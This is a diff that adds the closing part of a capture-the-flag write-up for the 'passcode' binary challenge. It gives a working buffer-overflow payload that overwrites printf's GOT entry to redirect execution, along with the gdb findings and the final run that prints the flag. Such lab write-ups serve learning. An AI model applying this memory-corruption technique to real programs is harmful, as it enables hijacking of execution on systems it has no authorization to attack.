@@ -186,3 +186,35 @@ pwndbg> x/x $ebp - 0x10
 pwndbg> x/x 0x0804c010
 0x804c010 <printf@got.plt>:     0xf7d91a90
 ```
+
+Then after consulting with someone I know he told me that the second scanf is expecting a decimal and not a string that I am giving him. so I just needed to modify it to give the actuall decimal number and not bytes
+
+New payload:
+```bash
+r < <(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 96 + b'\x10\xc0\x04\x08' + b'134513508')")
+```
+
+so did again did not work. So after some debugging I remembered that I am jumping to `setregid` function 
+```assembly
+call setregid
+```
+
+this meant that I was not giving it the correct inputs so I opened the disassembly in gdb and found the correct address.
+
+the address that I found was right before the `getegid` call and right after the `puts` call `0x804929e`
+
+```python
+In [1]: int(0x804929e)
+Out[1]: 134517406
+```
+
+Final Run
+```bash
+passcode@ubuntu:~$ ./passcode < <(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 96 + b'\x10\xc0\x04\x08' + b'134517406')")
+Toddler's Secure Login System 1.1 beta.
+enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+[flag🤫]
+enter passcode1 : Now I can safely trust you that you have credential :)
+```
+
+This challenge was the most difficult challenge that I've done so far. It required paying attention to a lot of small specifics and also if you did not know about the GOT before that is an extra challenge to analyze the data segment on the fly. In conclusion this was a really fun challenge that I learned a lot from and recommend to anyone thinking about doing it to go ahead and just dive in.
